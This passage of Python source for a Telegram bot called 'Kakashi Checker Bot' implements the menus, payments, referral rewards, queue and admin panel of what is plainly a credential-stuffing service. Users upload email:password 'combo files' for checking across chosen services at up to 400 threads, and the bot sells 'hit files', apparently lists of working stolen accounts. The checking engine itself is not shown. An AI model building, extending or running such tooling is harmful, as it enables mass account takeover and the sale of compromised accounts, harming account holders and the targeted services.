    data = query.data or ""

    try: ensure_user(msg)
    except Exception as e: logger.error(f"Error ensuring user in callback: {e}")

    user = get_user(chat_id)
    vip = is_vip(user)
    admin = is_admin(chat_id)
    
    async def edit(text: str, reply_markup: Optional[InlineKeyboardMarkup] = None):
        await edit_msg(chat_id, msg_id, text, reply_markup)

    # --- Ban gate ---
    if not admin and user and user.get("is_banned"):
        await edit("🚫 You have been banned from using this bot.")
        return

    # --- Channel membership gate ---
    if data == "check_membership":
        check_result = await is_member_of_all_channels(chat_id)
        if check_result["ok"]:
            user = get_user(chat_id) # Refresh user after potential referral update
            pts = user.get("referral_points", 0) if user else 0
            fc = user.get("free_checks", 0) if user else 0
            await edit(
                f"✅ {b('Welcome to Kakashi Checker Bot!')}\n\nStatus: {is_vip(user) and '💎 VIP' or '👤 Free'}\nPoints: {pts} | Free Checks: {fc}\n\nPick an option below:",
                main_menu(chat_id)
            )
        else:
            missing_btns = [[InlineKeyboardButton(f"📢 Join {ch.label}", url=ch.link)] for ch in check_result["missing"]]
            missing_btns.append([InlineKeyboardButton("✅ I've Joined All", callback_data="check_membership")])
            missing_list = '\n'.join(f'• {ch.label}' for ch in check_result['missing'])
            await edit(
                f"🚫 <b>Not done yet!</b>\n\nYou still need to join {len(check_result['missing']) == 1 and 'this channel' or 'these channels'}:\n"
                f"{missing_list}"
                f"\n\nJoin and press the button again.",
                reply_markup=InlineKeyboardMarkup(missing_btns)
            )
        return

    # Block non-admins who are not channel members
    if not admin and not (await is_member_of_all_channels(chat_id))["ok"]:
        await send_join_prompt(chat_id)
        return

    # --- Main Menu ---
    if data == "main_menu":
        user = get_user(chat_id)
        pts = user.get("referral_points", 0) if user else 0
        fc = user.get("free_checks", 0) if user else 0
        await edit(f"🏠 {b('Main Menu')}\n\nStatus: {is_vip(user) and '💎 VIP' or '👤 Free'}\nPoints: {pts} | Free Checks: {fc}", main_menu(chat_id))
        return

    # --- Support ---
    if data == "support":
        await edit(f"🆘 {b('Support')}\n\nContact our team:\n{b('@Your_Kakashi02')} and {b('@YorichiiPrime')}\n\nWe'll reply ASAP.\n\n💳 For payment support use: {b('@Your_Kakashi02')}", back_btn("main_menu"))
        return

    # --- Stock ---
    if data == "stock":
        prods = cursor.execute("SELECT * FROM products").fetchall()
        text = f"📦 {b('Stock')}\n\n"
        if not prods:
            await edit(text + "No products available.", back_btn("main_menu"))
            return
        
        for p in prods:
            qty = "∞" if p["quantity"] == -1 else p["quantity"]
            text += f"• {b(p['name'])} — Qty: {qty}\n"
        
        btns = [[InlineKeyboardButton(f"{p['name']}  |  Qty: {'∞' if p['quantity'] == -1 else p['quantity']}", callback_data=f"buy_product_{p['id']}")] for p in prods]
        btns.append([InlineKeyboardButton("🔙 Back", callback_data="main_menu")])
        await edit(text, reply_markup=InlineKeyboardMarkup(btns))
        return

    if data.startswith("buy_product_"):
        pid = int(data.replace("buy_product_", ""))
        prod = cursor.execute("SELECT * FROM products WHERE id=?", (pid,)).fetchone()
        if not prod: return
        qty = "∞" if prod["quantity"] == -1 else prod["quantity"]
        caption = f"🛒 {b(prod['name'])}\n\nQty available: {qty}\nPrice: ₹{prod['price']}\n\n{esc(prod['description'])}\n\nContact support to purchase:\n{b(SUPPORT)}"
        await show_qr(chat_id, msg_id, caption, InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="stock")]]))
        return

    # --- Hits store ---
    if data == "hits_menu":
        hfs = cursor.execute("SELECT id,name,quantity FROM hit_files").fetchall()
        text = f"💥 {b('Hit Files')}\n\n"
        if not hfs:
            await edit(text + "No hit files available.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🎯 My Hits", callback_data="my_hits"), InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]))
            return
        
        for h in hfs:
            qty = "∞" if h["quantity"] == -1 else h["quantity"]
            text += f"• {b(h['name'])} — Qty: {qty}\n"
        
        btns = [[InlineKeyboardButton(f"{h['name']}  |  Qty: {'∞' if h['quantity'] == -1 else h['quantity']}", callback_data=f"view_hit_file_{h['id']}")] for h in hfs]
        btns.append([InlineKeyboardButton("🎯 My Hits", callback_data="my_hits"), InlineKeyboardButton("🔙 Back", callback_data="main_menu")])
        await edit(text, reply_markup=InlineKeyboardMarkup(btns))
        return

    if data.startswith("view_hit_file_"):
        hfid = int(data.replace("view_hit_file_", ""))
        hf = cursor.execute("SELECT id,name,price,quantity FROM hit_files WHERE id=?", (hfid,)).fetchone()
        if not hf: return
        qty = "∞" if hf["quantity"] == -1 else hf["quantity"]
        caption = f"💥 {b(hf['name'])}\n\nQty available: {qty}\nPrice: ₹{hf['price']}\n\nContact support to purchase:\n{b(SUPPORT)}"
        await show_qr(chat_id, msg_id, caption, InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="hits_menu")]]))
        return

    # --- Buy ---
    if data == "buy":
        await edit(f"🛒 {b('Buy Menu')}", reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("💎 Premium VIP", callback_data="buy_vip")],
            [InlineKeyboardButton("💥 Hit Files", callback_data="hits_menu")],
            [InlineKeyboardButton("📦 Products", callback_data="stock")],
            [InlineKeyboardButton("🔙 Back", callback_data="main_menu")],
        ]))
        return

    # --- Buy VIP ---
    if data == "buy_vip":
        subs = cursor.execute("SELECT * FROM subscriptions ORDER BY days ASC").fetchall()
        text = f"💎 {b('VIP Plans')}\n\n"
        btns = []
        for s in subs:
            text += f"• {b(days_label(s['days']))} — ₹{s['price']}\n"
            btns.append([InlineKeyboardButton(f"{days_label(s['days'])}  |  ₹{s['price']}", callback_data=f"vip_plan_{s['id']}")])
        btns.append([InlineKeyboardButton("🔙 Back", callback_data="buy")])
        await edit(text, reply_markup=InlineKeyboardMarkup(btns))
        return

    if data.startswith("vip_plan_"):
        plan_id = int(data.replace("vip_plan_", ""))
        plan = cursor.execute("SELECT * FROM subscriptions WHERE id=?", (plan_id,)).fetchone()
        if not plan: return
        paid_label = b("I've Paid")
        caption = f"💎 {b('VIP — ' + days_label(plan['days']))}\nPrice: ₹{plan['price']}\n\nScan the QR to pay, then tap {paid_label} and send your UTR."
        await show_qr(chat_id, msg_id, caption, InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ I've Paid — Enter UTR", callback_data=f"submit_utr_{plan_id}")],
            [InlineKeyboardButton("🔙 Back", callback_data="buy_vip")],
        ]))
        return

    if data.startswith("submit_utr_"):
        plan_id = int(data.replace("submit_utr_", ""))
        plan = cursor.execute("SELECT * FROM subscriptions WHERE id=?", (plan_id,)).fetchone()
        if not plan: return
        user_state[chat_id] = {"action": "awaiting_utr", "data": {"planId": plan_id, "days": plan["days"], "price": plan["price"]}}
        await send(chat_id, f"📝 Enter your {b('UTR / Transaction ID')} to confirm ₹{plan['price']} payment:")
        return

    # --- Speed ---
    if data == "speed":
        cur_speed = user.get("speed", "medium") if user else "medium"
        def mk_speed_btn(s: str, label: str, vip_only: bool = False):
            return InlineKeyboardButton(f"{'✅ ' if cur_speed == s else ''}{label}{' 💎' if vip_only and not vip else ''}", callback_data=f"set_speed_{s}")
        
        await edit(
            f"⚡ {b('Speed Settings')}\n\nCurrent: {b(cur_speed)}\n\n"
            f"🐢 Slow = 30 threads\n🚶 Medium = 80 threads\n🏃 Fast = 150 threads\n"
            f"⚡ Superfast = 250 threads 💎\n🚀 Ultra = 400 threads 💎",
            reply_markup=InlineKeyboardMarkup([
                [mk_speed_btn("slow", "🐢 Slow"), mk_speed_btn("medium", "🚶 Medium")],
                [mk_speed_btn("fast", "🏃 Fast"), mk_speed_btn("superfast", "⚡ Superfast", True)],
                [mk_speed_btn("ultra", "🚀 Ultra", True)],
                [InlineKeyboardButton("🔙 Back", callback_data="main_menu")],
            ])
        )
        return

    if data.startswith("set_speed_"):
        speed = data.replace("set_speed_", "")
        if (speed == "superfast" or speed == "ultra") and not vip:
            await edit(f"⚡ {b('Ultra' if speed == 'ultra' else 'Superfast')} is {b('VIP only!')}\n\nUpgrade to unlock higher speeds.", reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("💎 Buy VIP", callback_data="buy_vip")],
                [InlineKeyboardButton("🔙 Back", callback_data="speed")],
            ]))
            return
        cursor.execute("UPDATE users SET speed=? WHERE chat_id=?", (speed, chat_id))
        conn.commit()
        await edit(f"✅ Speed set to {b(speed)}!", reply_markup=main_menu(chat_id))
        return

    # --- Services Menu ---
    if data.startswith("services_menu") or data.startswith("svc_"):
        current_user = get_user(chat_id)
        selected_services = get_selected_service_names(current_user)

        if data == "svc_all":
            selected_services = set(get_all_service_names())
            cursor.execute("UPDATE users SET selected_services=? WHERE chat_id=?", (json.dumps(list(selected_services)), chat_id))
            conn.commit()
        elif data == "svc_clear":
            selected_services = set()
            cursor.execute("UPDATE users SET selected_services=? WHERE chat_id=?", (json.dumps([]), chat_id))
            conn.commit()
        elif data.startswith("svc_all_cat_") or data.startswith("svc_clr_cat_"):
            is_all = data.startswith("svc_all_cat_")
            cat_idx = int(data.replace("svc_all_cat_", "").replace("svc_clr_cat_", ""))
            cat = CAT_KEYS[cat_idx]
            if cat:
                for svc in SERVICE_CATEGORIES[cat]:
                    if is_all: selected_services.add(svc)
                    else: selected_services.discard(svc)
                cursor.execute("UPDATE users SET selected_services=? WHERE chat_id=?", (json.dumps(list(selected_services)), chat_id))
                conn.commit()
            
            # Fall through to show category view
            svcs_in_cat = SERVICE_CATEGORIES.get(cat, [])
            cat_btns: List[List[InlineKeyboardButton]] = []
            for si, svc_name in enumerate(svcs_in_cat):
                cat_btns.append([InlineKeyboardButton(f"{'✅' if svc_name in selected_services else '❌'} {svc_name}", callback_data=f"svc_t_{cat_idx}_{si}")])
            
            enabled_count = sum(1 for s in svcs_in_cat if s in selected_services)
            cat_btns.append([
                InlineKeyboardButton("✅ All", callback_data=f"svc_all_cat_{cat_idx}"),
                InlineKeyboardButton("❌ Clear", callback_data=f"svc_clr_cat_{cat_idx}"),
            ])
            cat_btns.append([InlineKeyboardButton("🔙 Back to Categories", callback_data="services_menu")])
            await edit(
                f"🔍 {b(CAT_KEYS[cat_idx])} — {enabled_count}/{len(svcs_in_cat)} enabled\n\n<i>Tap a service to toggle it.</i>",
                reply_markup=InlineKeyboardMarkup(cat_btns)
            )
            return
        elif data.startswith("svc_t_"):
            parts = data.replace("svc_t_", "").split("_")
            cat_idx = int(parts[0])
            svc_idx = int(parts[1])
            cat = CAT_KEYS[cat_idx]
            if cat:
                svc_name = SERVICE_CATEGORIES[cat][svc_idx]
                if svc_name:
                    if svc_name in selected_services: selected_services.discard(svc_name)
                    else: selected_services.add(svc_name)
                    cursor.execute("UPDATE users SET selected_services=? WHERE chat_id=?", (json.dumps(list(selected_services)), chat_id))
                    conn.commit()
            
            # Redisplay category view
            svcs_in_cat = SERVICE_CATEGORIES.get(cat, [])
            enabled_count = sum(1 for s in svcs_in_cat if s in selected_services)
            cat_btns: List[List[InlineKeyboardButton]] = []
            for si, svc_name in enumerate(svcs_in_cat):
                cat_btns.append([InlineKeyboardButton(f"{'✅' if svc_name in selected_services else '❌'} {svc_name}", callback_data=f"svc_t_{cat_idx}_{si}")])
            
            cat_btns.append([
                InlineKeyboardButton("✅ All", callback_data=f"svc_all_cat_{cat_idx}"),
                InlineKeyboardButton("❌ Clear", callback_data=f"svc_clr_cat_{cat_idx}"),
            ])
            cat_btns.append([InlineKeyboardButton("🔙 Back to Categories", callback_data="services_menu")])
            await edit(
                f"🔍 {b(cat)} — {enabled_count}/{len(svcs_in_cat)} enabled\n\n<i>Tap a service to toggle it.</i>",
                reply_markup=InlineKeyboardMarkup(cat_btns)
            )
            return
        elif data.startswith("svc_cat_"):
            cat_idx = int(data.replace("svc_cat_", ""))
            cat = CAT_KEYS[cat_idx]
            if cat:
                svcs_in_cat = SERVICE_CATEGORIES[cat]
                enabled_count = sum(1 for s in svcs_in_cat if s in selected_services)
                cat_btns: List[List[InlineKeyboardButton]] = []
                for si, svc_name in enumerate(svcs_in_cat):
                    cat_btns.append([InlineKeyboardButton(f"{'✅' if svc_name in selected_services else '❌'} {svc_name}", callback_data=f"svc_t_{cat_idx}_{si}")])
                
                cat_btns.append([
                    InlineKeyboardButton("✅ All", callback_data=f"svc_all_cat_{cat_idx}"),
                    InlineKeyboardButton("❌ Clear", callback_data=f"svc_clr_cat_{cat_idx}"),
                ])
                cat_btns.append([InlineKeyboardButton("🔙 Back to Categories", callback_data="services_menu")])
                await edit(
                    f"🔍 {b(cat)} — {enabled_count}/{len(svcs_in_cat)} enabled\n\n<i>Tap a service to toggle it.</i>",
                    reply_markup=InlineKeyboardMarkup(cat_btns)
                )
                return

        # Main categories view
        fresh_user = get_user(chat_id)
        fresh_selected = get_selected_service_names(fresh_user)
        total_active = len(fresh_selected)
        cat_btns: List[List[InlineKeyboardButton]] = []
        for i, cat in enumerate(CAT_KEYS):
            svcs_in_cat = SERVICE_CATEGORIES[cat]
            enabled_count = sum(1 for s in svcs_in_cat if s in fresh_selected)
            status_emoji = "✅" if enabled_count == len(svcs_in_cat) else "❌" if enabled_count == 0 else "🔸"
            cat_btns.append([InlineKeyboardButton(f"{status_emoji} {cat} ({enabled_count}/{len(svcs_in_cat)})", callback_data=f"svc_cat_{i}")])
        
        cat_btns.append([
            InlineKeyboardButton("✅ Select All", callback_data="svc_all"),
            InlineKeyboardButton("❌ Clear All", callback_data="svc_clear"),
        ])
        cat_btns.append([InlineKeyboardButton("🔙 Back", callback_data="main_menu")])
        await edit(
            f"🔍 {b('Services')}\n\nTap a category to manage its services.\nTotal active: {b(str(total_active))} services\n\n<i>✅ All on  |  🔸 Partial  |  ❌ All off</i>",
            reply_markup=InlineKeyboardMarkup(cat_btns)
        )
        return

    # --- Stats ---
    if data == "stats":
        tot = cursor.execute("SELECT COUNT(*) as c FROM users").fetchone()["c"]
        vips = cursor.execute("SELECT COUNT(*) as c FROM users WHERE is_vip=1 AND (vip_expires_at=-1 OR vip_expires_at>?)", (int(time.time() * 1000),)).fetchone()["c"]
        tot_h = cursor.execute("SELECT COUNT(*) as c FROM hits").fetchone()["c"]
        
        await edit(
            f"📊 {b('Bot Stats')}\n\n👥 Users: {tot}\n💎 VIP: {vips}\n✅ Total Hits: {tot_h}\n\n"
            f"{b('Your Stats:')}\n✅ Hits: {user.get('hits', 0)}\n❌ Bad: {user.get('bad', 0)}\n🔄 Retries: {user.get('retries', 0)}\n📋 Checked: {user.get('total_checked', 0)}\n"
            f"🔗 Points: {user.get('referral_points', 0)}\n🆓 Free Checks: {user.get('free_checks', 0)}",
            back_btn("main_menu")
        )
        return

    # --- Queue Status ---
    if data == "queue_status":
        my_pos = -1
        for i, job in enumerate(check_queue):
            if job.chatId == chat_id:
                my_pos = i
                break
        
        is_checking = chat_id in active_checkers
        total_queue = len(check_queue)
        total_active = len(active_checkers)
        MAX_CONCURRENT_CHECKERS = 3 # Defined in TS, hardcoded here

        text = f"📋 {b('Check Queue')}\n\n"
        text += f"⚙️ Active Checks: {b(total_active)} / {MAX_CONCURRENT_CHECKERS}\n"
        text += f"⏳ Waiting in Queue: {b(total_queue)}\n\n"

        if is_checking:
            my_vip = is_vip(get_user(chat_id))
            vip_text = '\n💎 VIP check in progress' if my_vip else ''
            text += f"✅ {b('Your file is currently being checked!')}{vip_text}"
        elif my_pos >= 0:
            my_job = check_queue[my_pos]
            ahead = my_pos
            est_minutes = (ahead + 1) * 3 # Assuming 3 minutes per job
            text += f"🕐 {b('You are in the queue!')}\n"
            text += f"📍 Your position: {b(f'#{my_pos + 1}')}{' 💎' if my_job.isVip else ''}\n"
            text += f"👥 People ahead: {b(ahead)}\n"
            text += f"⏱ Est. wait: ~{b(f'{est_minutes} min')}\n\n"
            text += f"<i>You'll be notified when your check starts.</i>"
        elif total_queue == 0 and total_active < MAX_CONCURRENT_CHECKERS:
            text += f"✅ {b('Queue is empty!')} Send a .txt combo file to start checking instantly."
        else:
            text += f"📋 {b(f'{total_queue} job(s) waiting')}\n"
            vip_count = sum(1 for j in check_queue if j.isVip)
            if vip_count > 0:
                text += f"💎 {b(vip_count)} VIP | 👤 {b(total_queue - vip_count)} Free\n"
            text += f"<i>Send your combo file to join the queue.\\n💎 VIP users get priority!</i>"

        btns: List[List[InlineKeyboardButton]] = [[InlineKeyboardButton("🔄 Refresh", callback_data="queue_status")]]
        if is_checking: btns.append([InlineKeyboardButton("🛑 Stop Scan", callback_data="stop_scan")])
        if my_pos >= 0: btns.append([InlineKeyboardButton("❌ Leave Queue", callback_data="queue_leave")])
        btns.append([InlineKeyboardButton("🔙 Main Menu", callback_data="main_menu")])
        await edit(text, reply_markup=InlineKeyboardMarkup(btns))
        return

    # --- Leave Queue ---
    if data == "queue_leave":
        my_pos = -1
        for i, job in enumerate(check_queue):
            if job.chatId == chat_id:
                my_pos = i
                break
        
        if my_pos >= 0:
            check_queue.pop(my_pos)
            await edit(f"✅ {b('Removed from queue.')}\n\nYou can rejoin anytime by sending a new combo file.", back_btn("main_menu"))
        else:
            await edit("ℹ️ You are not in the queue.", back_btn("queue_status"))
        return

    # --- Stop Scan ---
    if data == "stop_scan":
        if chat_id in active_checkers:
            stopped_checkers.add(chat_id)
            await query.answer("🛑 Stopping scan... Please wait.")
        else:
            await query.answer("ℹ️ No active scan to stop.")
        return

    # --- Leaderboard ---
    if data == "leaderboard":
        top_users = cursor.execute(
            "SELECT * FROM users WHERE referral_points > 0 ORDER BY referral_points DESC LIMIT 10"
        ).fetchall()
        current_top_id = get_setting("leaderboard_top_id")
        medals = ["🥇", "🥈", "🥉", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣", "🔟"]
        text = f"🏆 {b('Referral Leaderboard')}\n\n"
        text += f"💎 {b('#1 earns VIP')} for as long as they hold the top spot!\n\n"
        if not top_users:
            text += "<i>No referrals yet. Be the first!</i>\n"
        else:
            for i, u in enumerate(top_users):
                un = f"@{esc(u['username'])}" if u["username"] else esc(u["first_name"])
                is_you = " <i>(you)</i>" if u["chat_id"] == chat_id else ""
                crown = " 👑" if str(u["chat_id"]) == current_top_id else ""
                text += f"{medals[i]} {b(un)}{crown} — {b(u['referral_points'])} pts{is_you}\n"
        
        # Show user's own rank if not in top 10
        user_in_top = any(u["chat_id"] == chat_id for u in top_users)
        if not user_in_top:
            my_rank_row = cursor.execute(
                "SELECT COUNT(*) as c FROM users WHERE referral_points > ?", (user.get("referral_points", 0),)
            ).fetchone()
            my_rank = (my_rank_row["c"] if my_rank_row else 0) + 1
            text += f"\n<i>Your rank: #{my_rank} ({user.get('referral_points', 0)} pts)</i>"
        
        text += f"\n\n<i>Share your referral link to climb the ranks!</i>"
        await edit(text, reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔗 My Referral Link", callback_data="referral")],
            [InlineKeyboardButton("🔙 Back", callback_data="main_menu")],
        ]))
        return

    # --- My Hits ---
    if data == "my_hits":
        text = (
            f"🎯 {b('My Hits')}\n\n"
            "For privacy, user hits are not saved in the database.\n\n"
            "Hits are only sent during the active check session."
        )
        await edit(text, back_btn("main_menu"))
        return

    # --- My Profile ---
    if data == "my_profile":
        u = user or {}
        uname = f"@{esc(u['username'])}" if u.get("username") else esc(u.get("first_name", "Unknown"))
        pts = u.get("referral_points", 0)
        fc = u.get("free_checks", 0)
        await edit(
            f"👤 {b('Profile')} — {uname}\n\n🆔 ID: {code(chat_id)}\nStatus: {is_vip(u) and f'💎 VIP ({esc(format_expiry(u))})' or '👤 Free'}\n⚡ Speed: {esc(u.get('speed', 'medium'))}\n\n"
            f"📊 {b('Stats:')}\n✅ Hits: {u.get('hits', 0)}\n❌ Bad: {u.get('bad', 0)}\n🔄 Retries: {u.get('retries', 0)}\n📋 Total: {u.get('total_checked', 0)}\n\n"
            f"🔗 {b('Ref Points:')} {pts}\n🆓 {b('Free Checks:')} {fc}\n<i>({POINTS_PER_CHECK} pts = 1 check | {POINTS_PER_VIP2D} pts = 2d VIP)</i>",
            back_btn("main_menu")
        )
        return

    # --- Referral ---
    if data == "referral":
        try:
            if application and application.bot:
                me = await application.bot.get_me()
                link = f"https://t.me/{me.username}?start=ref_{chat_id}"
                pts = user.get("referral_points", 0) if user else 0
                fc = user.get("free_checks", 0) if user else 0
                await edit(
                    f"🔗 {b('Referral Program')}\n\nShare your link:\n{code(link)}\n\n"
                    f"• {b('1 point')} per referral\n"
                    f"• {b(f'{POINTS_PER_CHECK} points')} = 1 free file check\n"
                    f"• {b(f'{POINTS_PER_VIP2D} points')} = 2 days VIP\n\n"
                    f"Your Points: {b(pts)}\nFree Checks banked: {b(fc)}\n\n"
                    f"Tap 🎁 {b('Redeem')} to use your points!",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🎁 Redeem Points", callback_data="redeem")],
                        [InlineKeyboardButton("🔙 Back", callback_data="main_menu")],
                    ])
                )
        except Exception as e:
            logger.error(f"Error getting bot info for referral: {e}")
            await edit("Could not load referral link.", back_btn("main_menu"))
        return

    # --- REDEEM ---
    if data == "redeem":
        pts = user.get("referral_points", 0) if user else 0
        fc = user.get("free_checks", 0) if user else 0
        await edit(
            f"🎁 {b('Redeem Points')}\n\n"
            f"Your Points: {b(pts)}\nFree Checks banked: {b(fc)}\n\n"
            f"Choose what to redeem:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton(f"🎯 1 Free Check  ({POINTS_PER_CHECK} pts)", callback_data="redeem_check")],
                [InlineKeyboardButton(f"💎 2 Days VIP  ({POINTS_PER_VIP2D} pts)", callback_data="redeem_vip")],
                [InlineKeyboardButton("🎁 Send Points to Someone", callback_data="redeem_send_points")],
                [InlineKeyboardButton("🔙 Back", callback_data="main_menu")],
            ])
        )
        return

    if data == "redeem_check":
        pts = user.get("referral_points", 0) if user else 0
        if pts < POINTS_PER_CHECK:
            await edit(
                f"❌ {b('Not enough points!')}\n\nYou need {b(POINTS_PER_CHECK)} points for 1 free check.\nYou have: {b(pts)} points.\n\nKeep referring to earn more!",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔗 Referral Link", callback_data="referral")], [InlineKeyboardButton("🔙 Back", callback_data="redeem")]])
            )
            return
        
        cursor.execute("UPDATE users SET referral_points=referral_points-?, free_checks=free_checks+1 WHERE chat_id=?", (POINTS_PER_CHECK, chat_id))
        conn.commit()
        new_user = get_user(chat_id)
        await edit(
            f"✅ {b('Redeemed!')}\n\n🎯 You got {b('1 Free File Check')}!\n\n"
            f"Points remaining: {b(new_user.get('referral_points', 0))}\nFree checks available: {b(new_user.get('free_checks', 0))}\n\n"
            f"Go to {b('Start Check')} to use it!",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🎯 Start Check", callback_data="start_check")], [InlineKeyboardButton("🔙 Back", callback_data="redeem")]])
        )
        return

    if data == "redeem_vip":
        pts = user.get("referral_points", 0) if user else 0
        if pts < POINTS_PER_VIP2D:
            await edit(
                f"❌ {b('Not enough points!')}\n\nYou need {b(POINTS_PER_VIP2D)} points for 2 days VIP.\nYou have: {b(pts)} points.\n\nKeep referring to earn more!",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔗 Referral Link", callback_data="referral")], [InlineKeyboardButton("🔙 Back", callback_data="redeem")]])
            )
            return
        
        current_expiry = user.get("vip_expires_at", 0) if is_vip(user) and user.get("vip_expires_at") != -1 else int(time.time() * 1000)
        new_expiry = current_expiry + 2 * 86400000
        cursor.execute("UPDATE users SET referral_points=referral_points-?, is_vip=1, vip_expires_at=? WHERE chat_id=?", (POINTS_PER_VIP2D, new_expiry, chat_id))
        conn.commit()
        new_user = get_user(chat_id)
        remaining_days = (new_expiry - int(time.time() * 1000)) // 86400000
        await edit(
            f"✅ {b('2 Days VIP Activated!')}\n\n"
            f"💎 VIP expires in: {b(f'{remaining_days} days')}\n"
            f"Points remaining: {b(new_user.get('referral_points', 0))}\n\n"
            f"{b('Congratulations!')} Enjoy VIP access!",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🎯 Start Check", callback_data="start_check")], [InlineKeyboardButton("🔙 Main Menu", callback_data="main_menu")]])
        )
        return

    if data == "redeem_send_points":
        pts = user.get("referral_points", 0) if user else 0
        if pts < 1:
            await edit(f"❌ {b('No points to send!')}\n\nYou have {b(pts)} points.", back_btn("redeem"))
            return
        user_state[chat_id] = {"action": "send_points_id", "data": {"senderPts": pts}}
        await edit(
            f"🎁 {b('Send Points')}\n\nYou have: {b(pts)} points\n\nEnter the {b('Chat ID')} of the person you want to send points to:",
            back_btn("redeem")
        )
        return

    # --- Start Check ---
    if data == "start_check":
        pts = user.get("referral_points", 0) if user else 0
        fc = user.get("free_checks", 0) if user else 0
        limit_txt = "No limit (VIP)" if vip else (f"Free check available ({fc} left)" if fc > 0 else "Max 5MB")
        user_state[chat_id] = {"action": "awaiting_combo_file"}
        free_check_msg = f'\n\n🆓 {b("You have " + str(fc) + " free check(s)!")} This will use 1.' if fc > 0 else ''
        await edit(
            f"📁 {b('Send your combo file')}\n\nFormat: {code('email:password')} (one per line)\nFile limit: {limit_txt}"
            f"{free_check_msg}"
            f"\n\nSend the .txt file now:",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]])
        )

    # --- ADMIN ---
    if not admin: return

    if data == "admin_panel":
        await edit(f"🔧 {b('Admin Panel')}\n\nWelcome, Admin. Select an option:", admin_menu(chat_id))
        return

    if data == "admin_manage_admins":
        if chat_id not in SUPER_ADMIN_IDS:
            await edit("🚫 Only super admins can manage admins.", back_btn("admin_panel"))
            return
        extra = [x for x in get_admin_ids() if x not in SUPER_ADMIN_IDS]
        text = f"👤 {b('Manage Admins')}\n\n"
        text += f"👑 {b('Super Admins')} (permanent):\n"
        for sid in SUPER_ADMIN_IDS:
            u = get_user(sid)
            tag = f"@{u['username']}" if u and u["username"] else (u["first_name"] if u else str(sid))
            text += f"• {esc(tag)} [{code(sid)}]\n"
        if extra:
            text += f"\n🔧 {b('Extra Admins')}:\n"
            for eid in extra:
                u = get_user(eid)
                tag = f"@{u['username']}" if u and u["username"] else (u["first_name"] if u else str(eid))
                text += f"• {esc(tag)} [{code(eid)}]\n"
        else:
            text += f"\n🔧 {b('Extra Admins')}: None\n"
        remove_btns = [[InlineKeyboardButton(f"➖ Remove {get_user(eid)['username'] or eid if get_user(eid) else eid}", callback_data=f"admin_remove_admin_{eid}")] for eid in extra]
        await edit(text, reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("➕ Add Admin", callback_data="admin_panel_add_admin")],
            *remove_btns,
            [InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")],
        ]))
        return

    if data == "admin_panel_add_admin":
        if chat_id not in SUPER_ADMIN_IDS:
            await edit("🚫 Only super admins can add admins.", back_btn("admin_panel"))
            return
        user_state[chat_id] = {"action": "admin_panel_add_admin"}
        await edit(f"➕ {b('Add Admin')}\n\nSend the {b('Telegram User ID')} of the person you want to make admin.\n\n<i>They must have started the bot first. Use /id to get an ID.</i>")
        return

    if data.startswith("admin_remove_admin_"):
        if chat_id not in SUPER_ADMIN_IDS:
            await edit("🚫 Only super admins can remove admins.", back_btn("admin_panel"))
            return
        target_id = int(data.replace("admin_remove_admin_", ""))
        if target_id in SUPER_ADMIN_IDS:
            await edit("🚫 Cannot remove a permanent super admin.", back_btn("admin_manage_admins"))
            return
        remove_extra_admin(target_id)
        tu = get_user(target_id)
        un = f"@{esc(tu['username'])}" if tu and tu["username"] else esc(tu["first_name"]) if tu else str(target_id)
        await edit(f"✅ {b(un)} [{code(target_id)}] has been {b('removed as admin')}.", back_btn("admin_manage_admins"))
        try:
            await send(target_id, f"ℹ️ Your admin access to this bot has been {b('revoked')} by a super admin.")
        except Exception:
            pass
        return

    if data == "admin_set_qr":
        current_qr = get_setting("qr_file_id")
        user_state[chat_id] = {"action": "admin_set_qr"}
        await edit(f"🖼️ {b('Set QR Image')}\n\nCurrent QR: {current_qr and '✅ Set' or '❌ Not set'}\n\nSend the QR image (photo) now:")
        return

    if data == "admin_channels":
        channels = get_channels()
        text = f"📌 {b('Required Channels')}\n\n"
        if not channels:
            text += "❌ No channels set. Users can access the bot freely.\n"
        else:
            for i, ch in enumerate(channels):
                can_check = "✅" if ch.id else "⚠️ (no membership check)"
                text += f"{i + 1}. {b(ch.label)} {can_check}\n"
        
        text += (
            f"\n📌 <b>Tips:</b>\n• Public channels: Bot must be <b>Admin</b> to verify membership.\n• Private channels: Provide the numeric Chat ID so the bot can verify membership (bot must also be Admin in the private channel).\n• ⚠️ = invite-link only, no verification. Re-add with Chat ID to enable it."
        )
        remove_buttons = [[InlineKeyboardButton(f"🗑 Remove {ch.label}", callback_data=f"admin_remove_channel_{i}")] for i, ch in enumerate(channels)]
        sweep_label = "⏳ Sweep Running..." if sweep_running else "🔄 Force Check All Users"
        await edit(text, reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("➕ Add Channel", callback_data="admin_add_channel")],
            *remove_buttons,
            [InlineKeyboardButton(sweep_label, callback_data="admin_force_check_channels")],
            [InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")],
        ]))
        return

    if data == "admin_force_check_channels":
        if sweep_running:
            await edit("⏳ A sweep is already in progress. Please wait for it to finish.", back_btn("admin_channels"))
            return
        channels = get_channels()
        checkable = [c for c in channels if c.id]
        if not checkable:
            await edit("ℹ️ No checkable channels set. Add a public channel with @username first.", back_btn("admin_channels"))
            return
        total_users = cursor.execute("SELECT COUNT(*) as c FROM users WHERE is_banned=0").fetchone()["c"]
        await edit(
            f"🔄 {b('Force Check Started')}\n\n"
            f"Checking {b(total_users)} users against {b(len(checkable))} channel(s).\n\n"
            f"⏳ This runs in the background. You will receive a summary message when done.\n\n"
